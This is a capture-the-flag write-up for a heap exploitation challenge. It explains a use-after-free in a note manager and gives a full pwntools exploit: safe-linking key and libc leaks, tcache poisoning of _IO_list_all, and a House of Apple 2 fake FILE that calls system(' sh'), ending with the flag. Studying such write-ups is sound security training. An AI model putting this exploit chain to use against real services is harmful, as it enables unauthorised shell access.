# 67 - Detailed Writeup

**Challenge:** A simple note taker (Heap exploitation)  
**Category:** Pwn  
**Difficulty:** Medium-Hard  

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Vulnerability Analysis](#vulnerability-analysis)
3. [Exploitation Strategy](#exploitation-strategy)
4. [Heap Leak (Safe-linking Bypass)](#heap-leak)
5. [Libc Leak (Unsorted Bin)](#libc-leak)
6. [Tcache Poisoning](#tcache-poisoning)
7. [House of Apple 2 (FSOP)](#house-of-apple-2)
8. [Final Exploit](#final-exploit)
9. [Common Pitfalls & Debugging](#common-pitfalls)
10. [Lessons Learned](#lessons-learned)

---

## Reconnaissance

### Initial Analysis

```bash
# Check file type and protections
file chall
checksec chall

# Output:
# chall: ELF 64-bit LSB pie executable, x86-64
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
```

**All protections enabled!** This means:
- **PIE**: Need binary base leak (but we have symbols)
- **Full RELRO**: GOT is read-only, can't overwrite GOT entries
- **NX**: No shellcode on stack/heap
- **Canary**: Stack overflow protection

### Libc Version

```bash
strings libc.so.6 | grep "GNU C Library"
# Output: GNU C Library (GNU libc) stable release version 2.42.

# Check if hooks exist
readelf -s libc.so.6 | grep -E "__malloc_hook|__free_hook"
# Output: (empty - hooks removed in glibc 2.34+)
```

**Libc 2.42 is modern!** Key implications:
- No `__malloc_hook` / `__free_hook` (removed in 2.34)
- Safe-linking enabled on tcache (since 2.32)
- Must use modern techniques: FSOP, exit handlers, or TLS

### Running the Binary

```bash
./chall_patched

# Output:
# 1. Create Note
# 2. Delete Note
# 3. Read Note
# 4. Edit Note
# 5. Exit
```

Classic heap note manager. Test basic operations:
```
> 1
Index: 0
Size: 32
Data: AAAAAAAA
Note created!

> 3
Index: 0
Data: AAAAAAAA

> 2
Index: 0
Note deleted!

> 3
Index: 0
Data: (garbage or libc pointers!)
```

**UAF confirmed!** After delete, can still read/edit.

### Static Analysis with objdump

```bash
# Find interesting functions
objdump -t chall | grep -E "notes|sizes"
# 0000000000004060 B notes
# 00000000000040c0 B sizes

# Disassemble delete_note
objdump -d chall | grep -A 30 "<delete_note>"
```

Key finding: `delete_note()` calls `free()` but **never nulls the pointer**.

---

## Vulnerability Analysis

### Source Code Reconstruction

Based on disassembly and dynamic analysis:

```c
void *notes[10];  // BSS at 0x4060
int sizes[10];    // BSS at 0x40c0

void create_note() {
    int idx = get_int();
    if (idx < 0 || idx > 9) return;

    int size = get_int();
    if (size <= 0 || size > 0x400) return;  // Max 1024 bytes

    void *ptr = malloc(size);
    notes[idx] = ptr;
    sizes[idx] = size;
    read(0, ptr, size);  // Read exactly 'size' bytes
}

void delete_note() {
    int idx = get_int();
    if (idx < 0 || idx > 9) return;
    if (notes[idx] == NULL) return;

    free(notes[idx]);
    // BUG: notes[idx] NOT set to NULL!
    // BUG: sizes[idx] NOT cleared!
}

void read_note() {
    int idx = get_int();
    if (idx < 0 || idx > 9) return;
    if (notes[idx] == NULL) return;  // Still non-NULL after free!

    write(1, notes[idx], sizes[idx]);  // UAF read primitive
}

void edit_note() {
    int idx = get_int();
    if (idx < 0 || idx > 9) return;
    if (notes[idx] == NULL) return;

    read(0, notes[idx], sizes[idx]);  // UAF write primitive
}
```

### The Vulnerability: Use-After-Free

**Location:** `delete_note()` at offset +141 (after `call free@plt`)

**Bug:** Pointer not cleared after `free()`

**Impact:**
- **UAF Read**: `read_note()` can read freed chunks → leak heap/libc pointers
- **UAF Write**: `edit_note()` can write to freed chunks → tcache poisoning

**Constraints:**
- Max 10 notes (indices 0-9)
- Size range: 1 to 0x400 (1024 bytes)
- Unlimited operations (infinite loop)

---

## Exploitation Strategy

### The Challenge

With libc 2.42, we face:
1. **Safe-linking** on tcache fd pointers (encrypted as `fd ^ (chunk_addr >> 12)`)
2. **No hooks** (`__malloc_hook` / `__free_hook` removed)
3. **Full RELRO** (can't overwrite GOT)

### The Solution: House of Apple 2 (FSOP)

**Attack chain:**
```
UAF → Heap Leak → Libc Leak → Tcache Poison →
Overwrite _IO_list_all → Fake FILE structure →
exit() triggers FSOP → system(" sh")
```

**Why House of Apple 2?**
- Works on modern libc (2.35+)
- Bypasses vtable checks
- Uses `_IO_wfile_jumps` (wide FILE operations)
- Triggers on `exit()` via `_IO_flush_all_lockp()`

---

## Heap Leak (Safe-linking Bypass)

### Understanding Safe-linking

Since glibc 2.32, tcache fd pointers are encrypted:
```c
// Encryption (in malloc)
stored_fd = real_fd ^ (chunk_addr >> 12)

// Decryption (in malloc)
real_fd = stored_fd ^ (chunk_addr >> 12)
```

The key is `chunk_addr >> 12` (upper address bits of the chunk itself).

### The Trick: Tcache Tail has NULL fd

When the **last chunk** in a tcache bin has `real_fd = NULL`:
```
stored_fd = NULL ^ (chunk_addr >> 12)
          = 0 ^ key
          = key
```

**We get the key directly by reading the tail chunk!**

### Implementation

```python
# Allocate and free chunks to populate tcache
create(0, 0x400, b'A' * 8)
create(1, 0x400, b'B' * 8)
# ... more chunks ...

# Free chunks into tcache
delete(0)  # chunk0 becomes tail (fd = NULL)
delete(1)  # chunk1 points to chunk0

# Read chunk0 (tail) -> get encryption key
data0 = read_note(0)
heap_key = u64(data0[:8])  # This IS the key!
heap_base = heap_key << 12

print(f"Heap base: {hex(heap_base)}")
```

### Getting Exact Chunk Address

The key gives us the **page**, but we need the **exact address**:

```python
# Read chunk1 (points to chunk0)
data1 = read_note(1)
encrypted_fd = u64(data1[:8])

# Decrypt: fd = encrypted_fd ^ key
# But we need to fully demangle (XOR propagates)
def demangle_ptr(v):
    r = v
    for _ in range(4):  # Iterate to fully decrypt
        r = v ^ (r >> 12)
    return r

chunk0_addr = demangle_ptr(encrypted_fd)
print(f"chunk0 exact addr: {hex(chunk0_addr)}")
```

**Why 4 iterations?** Because safe-linking uses recursive XOR. Each iteration reveals 12 more bits.

### Debugging with pwndbg

```bash
# Run with GDB
gdb ./chall_patched
pwndbg> set follow-fork-mode child
pwndbg> b *delete_note+141    # After free()
pwndbg> r

# After first delete
pwndbg> heap
pwndbg> bins
pwndbg> x/20gx <chunk0_addr>
# First qword should be encrypted fd

# Verify calculation
pwndbg> p/x <chunk0_addr> >> 12
# Should match the leaked key
```

---

## Libc Leak (Unsorted Bin)

### The Problem: Size Constraint

Binary only allows `size <= 0x400` (1024 bytes). This creates chunks of size **0x410**, which is the **last tcache bin**.

**Can't directly allocate large chunks for unsorted bin!**

### The Solution: Fill Tcache

Tcache bins hold **max 7 chunks**. When tcache is full, the 8th freed chunk goes to the **unsorted bin**!

```python
# Allocate 8 chunks of max size
for i in range(8):
    create(i, 0x400, b'A' * 8)

# Guard chunk to prevent top chunk consolidation
create(8, 0x20, b'G' * 8)

# Free 7 chunks -> fills tcache[0x410]
for i in range(7):
    delete(i)

# Free 8th chunk -> goes to unsorted bin!
delete(7)
```

### Leaking from Unsorted Bin

Unsorted bin is a **doubly-linked list** with head in `main_arena` (libc .data):

```
unsorted_bin_head = &main_arena.bins[0]  // libc + offset + 96

freed_chunk.fd = unsorted_bin_head
freed_chunk.bk = unsorted_bin_head
```

```python
# UAF read chunk 7
data7 = read_note(7)
libc_leak = u64(data7[:8])

# Calculate libc base
# UNSORTED_BIN_OFFSET = offset from libc base to main_arena
libc_base = libc_leak - UNSORTED_BIN_OFFSET
```

### Finding UNSORTED_BIN_OFFSET

**Method 1: Dynamic (with GDB)**
```bash
gdb ./chall_patched
pwndbg> b *read_note+187
pwndbg> r
# ... do the leaks ...
pwndbg> vmmap libc
# 0x7ffff7c00000 - 0x7ffff7e00000  libc.so.6

pwndbg> x/gx $rsi  # $rsi points to freed chunk
# 0x555555559000: 0x00007ffff7de7b20

# Calculate offset:
# leaked_addr = 0x7ffff7de7b20
# libc_base   = 0x7ffff7c00000
# offset      = 0x1e7b20
```

**Method 2: With libc.sym (if available)**
```python
# Check if symbol exists
libc = ELF('./libc.so.6')
if 'main_arena' in libc.sym:
    main_arena_offset = libc.sym.main_arena
    UNSORTED_BIN_OFFSET = main_arena_offset + 96
```

**For libc 2.42, common offsets:**
- `0x1e7b20` (most common)
- `0x1e6b20`
- `0x1e8b20`

### Verifying Libc Base

```python
libc_base = libc_leak - 0x1e7b20

# Sanity checks:
# 1. Should be page-aligned
assert (libc_base & 0xfff) == 0

# 2. Should be in valid range
assert 0x7f0000000000 < libc_base < 0x800000000000

# 3. Symbols should make sense
system_addr = libc_base + libc.sym['system']
print(f"system @ {hex(system_addr)}")  # Should look reasonable
```

---

## Tcache Poisoning

### Goal

Overwrite `_IO_list_all` pointer in libc to point to our fake FILE structure.

### Setup

```python
# Allocate chunks from unsorted bin remainder
create(7, 0x100, b'P' * 8)  # Reuse index 7
create(9, 0x100, b'Q' * 8)

# Free both into tcache[0x110]
delete(9)
delete(7)  # 7 is now tcache head
```

### The Poison

```python
target = libc.sym._IO_list_all  # Address to overwrite

# Calculate chunk7's address (where it will be allocated)
note7_addr = chunk0_addr + 7 * 0x410

# Encrypt target with safe-linking
def mangle(addr, location):
    return addr ^ (location >> 12)

encrypted = mangle(target, note7_addr)

# UAF write: overwrite chunk7's fd
edit(7, p64(encrypted).ljust(0x100, b'\x00'))
```

### Double Allocation

```python
# First allocation: pops chunk7 (real freed chunk)
create(7, 0x100, b'R' * 8)

# Second allocation: malloc returns _IO_list_all!
# Whatever we write here goes to _IO_list_all
create(9, 0x100, p64(fake_file_addr))
```

**Now `_IO_list_all` points to our fake FILE structure!**

### Why This Works

```
Before poison:
tcache[0x110]: chunk7 -> chunk9 -> NULL

After edit(7, encrypted_fd):
tcache[0x110]: chunk7 -> _IO_list_all -> ???

After create(7, ...):
tcache[0x110]: _IO_list_all -> ???

After create(9, fake_file_addr):
_IO_list_all = fake_file_addr  ✓
```

### Common Mistake I Made

❌ **Wrong:** `encrypted = target ^ heap_key`
✅ **Correct:** `encrypted = target ^ (note7_addr >> 12)`

**Why?** Safe-linking uses the **chunk's address**, not the heap base!

---

## House of Apple 2 (FSOP)

### What is FSOP?

**File Stream Oriented Programming:** Exploit FILE structure operations to gain code execution.

### How exit() Works

```c
void exit(int status) {
    __run_exit_handlers(status);  // Calls atexit handlers
}

// Inside exit handlers:
_IO_flush_all_lockp() {
    // Iterate _IO_list_all chain
    for (fp = _IO_list_all; fp != NULL; fp = fp->_chain) {
        // If write buffer is dirty
        if (fp->_IO_write_ptr > fp->_IO_write_base) {
            // Call _IO_OVERFLOW via vtable
            vtable->__overflow(fp);
        }
    }
}
```

### The House of Apple 2 Trick

If we use `_IO_wfile_jumps` as vtable:
```c
_IO_wfile_overflow(fp) {
    // ...
    _IO_wdoallocbuf(fp);
}

_IO_wdoallocbuf(fp) {
    _IO_WDOALLOCATE(fp);  // Calls wide_vtable->__doallocate
}

#define _IO_WDOALLOCATE(fp) \
    (*fp->_wide_data->_wide_vtable->__doallocate)(fp)
```

**If we set `__doallocate = system`:**
```
system(fp)  where fp->_flags = " sh\x00"
→ system(" sh")
→ SHELL!
```

### Building the Fake FILE

**Structure layout:**
```
fake_file_addr + 0x000: _IO_FILE_plus (0x100 bytes)
fake_file_addr + 0x100: _IO_wide_data (0x100 bytes)
fake_file_addr + 0x200: fake_wide_vtable (0x100 bytes)
fake_file_addr + 0x300: _lock (dummy)
```

**1. Fake FILE Structure**
```python
fake_file = flat({
    0x00: p32(0x68732020) + p32(0),  # _flags = "  sh" (little-endian)
    0x28: p64(1),                     # _IO_write_ptr = 1 (dirty!)
    0x88: p64(lock_addr),             # _lock (required by some checks)
    0xa0: p64(fake_wide_data_addr),   # _wide_data
    0xd8: p64(io_wfile_jumps),        # vtable = _IO_wfile_jumps
}, filler=b'\x00', length=0x100)
```

**Why `_IO_write_ptr = 1`?**
Must be > `_IO_write_base` (default 0) to trigger overflow.

**Why `_flags = "  sh"`?**
`system(fp)` reads fp as a string. We put the command at offset 0!

**2. Fake Wide Data**
```python
fake_wide = flat({
    0xe0: p64(fake_wide_vtable_addr),  # _wide_vtable
}, filler=b'\x00', length=0x100)
```

**3. Fake Wide Vtable**
```python
fake_wvtable = flat({
    0x68: p64(system_addr),  # __doallocate offset
}, filler=b'\x00', length=0x100)
```

**Why offset 0x68?**
`__doallocate` is at offset 0x68 in `_IO_jump_t` structure:
```c
struct _IO_jump_t {
    // ... other function pointers ...
    void *__dummy;       // +0x60
    void *__doallocate;  // +0x68  ← We overwrite this
};
```

### Placing the Fake FILE

```python
# Allocate a large chunk to hold our structures
create(0, 0x400, b'X' * 0x400)  # Reuse index 0

# This chunk is at a known address (calculated from heap leak)
fake_file_addr = chunk6_addr  # chunk0 + 6 * 0x410

# Build and write the payload
payload = fake_file + fake_wide + fake_wvtable + b'\x00' * 0x100
edit(0, payload)
```

### Calculating Addresses

**Critical:** All pointers must be correct!

```python
chunk0_addr = <from heap leak>

# Each chunk is 0x410 bytes (including metadata)
chunk6_addr = chunk0_addr + 6 * 0x410
chunk7_addr = chunk0_addr + 7 * 0x410

# Our fake FILE is in chunk6
fake_file_addr = chunk6_addr

# Sub-structures are within the same chunk
fake_wide_data_addr = fake_file_addr + 0x100
fake_wide_vtable_addr = fake_file_addr + 0x200
lock_addr = fake_file_addr + 0x300
```

### Common Mistakes I Made

❌ **Used wrong offsets in FILE structure**
✅ Check actual structure with `pwndbg> ptype struct _IO_FILE_plus`

❌ **Forgot `_lock` field**
✅ FILE validation checks `_lock != NULL`

❌ **Wrong `_IO_write_base` offset (used 0x20 instead of default 0)**
✅ Just set `_IO_write_ptr = 1` and leave `_IO_write_base` as 0

❌ **Wrong chunk address calculation**
✅ Account for tcache_perthread_struct at heap start (~0x290 bytes)

---

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6')

UNSORTED_BIN_OFFSET = 0x1e7b20

def conn():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(['./ld-linux-x86-64.so.2', '--library-path', '.', './chall'])

p = conn()

def menu_wait(): p.recvuntil(b'> ')
def create(idx, size, data):
    p.sendline(b'1'); p.recvuntil(b'Index: '); p.sendline(str(idx).encode())
    p.recvuntil(b'Size: '); p.sendline(str(size).encode()); p.recvuntil(b'Data: ')
    if len(data) < size: data = data.ljust(size, b'\x00')
    p.send(data[:size]); p.recvuntil(b'> ')
def delete(idx):
    p.sendline(b'2'); p.recvuntil(b'Index: '); p.sendline(str(idx).encode()); p.recvuntil(b'> ')
def read_note(idx):
    p.sendline(b'3'); p.recvuntil(b'Index: '); p.sendline(str(idx).encode())
    p.recvuntil(b'Data: '); data = p.recvuntil(b'1. Create', drop=True); p.recvuntil(b'> ')
    return data
def edit(idx, data):
    p.sendline(b'4'); p.recvuntil(b'Index: '); p.sendline(str(idx).encode())
    p.recvuntil(b'New Data: '); p.send(data); p.recvuntil(b'> ')
def mangle(t, l): return t ^ (l >> 12)
def demangle_ptr(v):
    r = v
    for _ in range(4): r = v ^ (r >> 12)
    return r

menu_wait()

# Phase 1: Leak libc and heap
log.info("Phase 1: Leaking libc and heap")
for i in range(8): create(i, 0x400, b'A' * 8)
create(8, 0x20, b'G' * 8)
for i in range(7): delete(i)
delete(7)

data7 = read_note(7); libc_leak = u64(data7[:8]); libc.address = libc_leak - UNSORTED_BIN_OFFSET
log.success(f"libc base: {hex(libc.address)}")

data0 = read_note(0); heap_base = u64(data0[:8]) << 12
data1 = read_note(1); chunk0_addr = demangle_ptr(u64(data1[:8]))
log.success(f"heap base: {hex(heap_base)}, chunk0: {hex(chunk0_addr)}")

chunk7_addr = chunk0_addr + 7 * 0x410
chunk6_addr = chunk0_addr + 6 * 0x410

# Phase 2: Tcache poisoning setup
log.info("Phase 2: Tcache poisoning")
create(7, 0x100, b'P' * 8); note7_addr = chunk7_addr
create(9, 0x100, b'Q' * 8)
create(0, 0x400, b'X' * 0x400); fake_file_addr = chunk6_addr

delete(9); delete(7)
target = libc.sym._IO_list_all
edit(7, p64(mangle(target, note7_addr)).ljust(0x100, b'\x00'))
create(7, 0x100, b'R' * 8)

# Phase 3: Build fake FILE (House of Apple 2)
log.info("Phase 3: Building fake FILE")
system_addr = libc.sym.system
io_wfile_jumps = libc.sym._IO_wfile_jumps
fake_wide_data_addr = fake_file_addr + 0x100
fake_wide_vtable_addr = fake_file_addr + 0x200
lock_addr = fake_file_addr + 0x300

fake_file = flat({
    0x00: p32(0x68732020) + p32(0),  # _flags = "  sh"
    0x28: p64(1),                     # _IO_write_ptr = 1
    0x88: p64(lock_addr),             # _lock
    0xa0: p64(fake_wide_data_addr),   # _wide_data
    0xd8: p64(io_wfile_jumps),        # vtable
}, filler=b'\x00', length=0x100)

fake_wide = flat({
    0xe0: p64(fake_wide_vtable_addr), # _wide_vtable
}, filler=b'\x00', length=0x100)

fake_wvtable = flat({
    0x68: p64(system_addr),           # __doallocate -> system
}, filler=b'\x00', length=0x100)

payload = fake_file + fake_wide + fake_wvtable + b'\x00' * 0x100
edit(0, payload)

# Phase 4: Write fake FILE addr to _IO_list_all
log.info("Phase 4: Overwriting _IO_list_all")
create(9, 0x100, p64(fake_file_addr))
log.success(f"_IO_list_all -> {hex(fake_file_addr)}")

# Phase 5: Trigger FSOP
log.success("Triggering FSOP via exit()...")
p.sendline(b'5')
p.interactive()
```

### Running the Exploit

```bash
# Local
python3 exploit_correct.py LOCAL

# Remote
python3 exploit_correct.py REMOTE HOST=<ip> PORT=<port>

# With GDB
python3 exploit_correct.py LOCAL GDB
```

---

## Common Pitfalls & Debugging

### Issue 1: Libc Leak Returns Garbage (0x5858... = 'X')

**Cause:** Not sending full `size` bytes when creating notes.

```python
# Wrong:
create(i, 0x400, b'A' * 8)  # Only sends 8 bytes, read() blocks!

# Correct:
create(i, 0x400, b'A' * 8)
# But with proper padding in the create() function:
if len(data) < size: data = data.ljust(size, b'\x00')
p.send(data[:size])
```

### Issue 2: read_note() Hangs or Gets Wrong Data

**Cause:** Reading until `\n` instead of menu.

```python
# Wrong:
return r.recvline()

# Correct:
data = p.recvuntil(b'1. Create', drop=True)  # Read until menu
p.recvuntil(b'> ')  # Consume rest of menu
return data
```

### Issue 3: Wrong Heap Address Calculation

**Cause:** Not accounting for tcache_perthread_struct.

```python
# The heap looks like:
# heap_base + 0x000: tcache_perthread_struct (~0x290 bytes)
# heap_base + 0x290: chunk 0
# heap_base + 0x6a0: chunk 1 (0x290 + 0x410)
# ...

# So chunk0 is NOT at heap_base!
# Get exact address via demangling:
chunk0_addr = demangle_ptr(u64(read_note(1)[:8]))
```

### Issue 4: Tcache Poison Fails (malloc returns NULL)

**Cause:** Wrong safe-linking encryption.

```python
# Wrong:
encrypted = target ^ heap_key  # Using heap base key

# Correct:
encrypted = target ^ (note7_addr >> 12)  # Using chunk's address
```

**Debugging:**
```bash
pwndbg> heap
pwndbg> bins
# Check tcache[0x110] chain

pwndbg> x/gx <chunk7_addr>
# See if fd looks right

pwndbg> p/x <target> ^ (<note7_addr> >> 12)
# Manually calculate what it should be
```

### Issue 5: FSOP Doesn't Trigger Shell

**Cause:** Wrong FILE structure offsets or missing fields.

**Debug with pwndbg:**
```bash
pwndbg> b *exit  # Break before exit
pwndbg> c

# Examine our fake FILE
pwndbg> x/60gx <fake_file_addr>

# Check _IO_list_all
pwndbg> x/gx <libc_base + _IO_list_all_offset>
# Should point to fake_file_addr

# Step through exit
pwndbg> si
# Watch for _IO_flush_all_lockp call
# Watch for system call with argument
```

**Verify field offsets:**
```bash
pwndbg> ptype struct _IO_FILE_plus
# Check actual offsets in your libc

pwndbg> ptype struct _IO_wide_data
```

---

## Lessons Learned

### What I Did Wrong (and How to Fix It)

#### 1. **Wrong UNSORTED_BIN_OFFSET**

**Mistake:** Guessed `0x21a6a0` based on common offsets.

**Fix:** Always verify with GDB:
```bash
pwndbg> vmmap libc
pwndbg> x/gx <leaked_value>
# Calculate: leaked - libc_base
```

**Lesson:** Never hardcode offsets without verification. Different libc builds have different layouts.

#### 2. **Forgot to Demangle Heap Pointers**

**Mistake:** Used `heap_key` directly as chunk address.

**Fix:** Implemented `demangle_ptr()` to fully decrypt:
```python
def demangle_ptr(v):
    r = v
    for _ in range(4): r = v ^ (r >> 12)
    return r
```

**Lesson:** Safe-linking uses recursive XOR. Reading the tcache tail gives the key, but reading other chunks needs full decryption.

#### 3. **Wrong FILE Structure Offsets**

**Mistake:** Used offsets from older libc or blog posts.

**Fix:** Check actual structure in GDB:
```bash
pwndbg> ptype struct _IO_FILE_plus
```

**Lesson:** Structure layouts change between libc versions. Always verify with your target libc.

#### 4. **Missing _lock Field**

**Mistake:** Forgot to set `_lock` field in fake FILE.

**Fix:** Added `0x88: p64(lock_addr)` to fake_file.

**Lesson:** Modern glibc validates FILE structures more strictly. Missing fields cause crashes.

#### 5. **Incorrect Chunk Address Calculation**

**Mistake:** Assumed `chunk0 = heap_base + 0x10`.

**Fix:** Used exact address from demangled pointer.

**Lesson:** Don't make assumptions about heap layout. Use actual leaked addresses.

### Key Insights

1. **Modern heap exploitation is harder but follows patterns:**
   - Safe-linking → Need heap leak
   - No hooks → Use FSOP or exit handlers
   - Full RELRO → Target libc structures, not GOT

2. **Debug incrementally:**
   - Verify each leak works before moving on
   - Test tcache poison with known addresses first
   - Build fake structures step-by-step

3. **pwndbg is essential:**
   - `heap` command shows chunk layout
   - `bins` shows tcache/fastbin/unsorted bin state
   - `x/60gx` to inspect structures
   - `vmmap` to verify address ranges

4. **Read the source:**
   - glibc source code for FILE structure definitions
   - Understanding `_IO_flush_all_lockp` flow is critical
   - Know why each field in fake FILE matters

### References for Future Challenges

- [glibc 2.35+ FSOP techniques](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc)
- [House of Apple writeup](https://binholic.blogspot.com/2022/04/house-of-apple-prevalent-io-file.html)
- [Safe-linking analysis](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/)
- [how2heap](https://github.com/shellphish/how2heap) - Modern heap exploitation techniques

---

## Quick Command Reference

```bash
# === Static Analysis ===
file chall && checksec chall
strings libc.so.6 | grep "GNU C Library"
readelf -s libc.so.6 | grep -E "__malloc_hook|__free_hook"
objdump -t chall | grep -E "notes|sizes"
ROPgadget --binary libc.so.6 --only "pop|ret" | grep "pop rdi"

# === Dynamic Analysis (pwndbg) ===
gdb ./chall_patched
pwndbg> b *delete_note+141
pwndbg> b *read_note+187
pwndbg> r

# Heap inspection
pwndbg> heap
pwndbg> bins
pwndbg> tcache
pwndbg> x/20gx <chunk_addr>

# Memory maps
pwndbg> vmmap
pwndbg> vmmap libc
pwndbg> vmmap heap

# Structure inspection
pwndbg> ptype struct _IO_FILE_plus
pwndbg> ptype struct _IO_wide_data
pwndbg> x/60gx <fake_file_addr>

# Calculate offsets
pwndbg> p/x <leaked_value> - <base_addr>
pwndbg> p/x <addr> >> 12  # Safe-linking key

# === Running Exploit ===
python3 exploit_correct.py LOCAL
python3 exploit_correct.py LOCAL GDB
python3 exploit_correct.py REMOTE HOST=<ip> PORT=<port>
```

---

**Flag:** `0xfun{p4cm4n_Syu_br0k3_my_xpl0it_btW}`

---
